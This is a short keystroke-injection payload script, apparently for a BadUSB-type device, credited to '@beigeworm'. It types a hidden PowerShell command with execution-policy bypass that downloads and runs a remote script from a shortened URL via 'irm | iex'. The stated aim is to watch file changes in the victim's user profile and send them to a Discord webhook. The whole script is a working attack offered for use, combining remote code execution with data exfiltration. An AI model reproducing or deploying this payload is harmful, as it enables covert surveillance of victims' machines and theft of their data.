// Title: beigeworm's monitor file changes to Discord Webhook.
// Author: @beigeworm
// Description: This script monitors any file changes in the USERPROFILE directory and posts results to a discord webhook.
// Target: Windows 10
// *SETUP*
// replace DISCORD_WEBHOOK_HERE with your Discord Webhook.

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://is.gd/bw_fm_to_dc | iex");
delay(500);
press("ENTER");
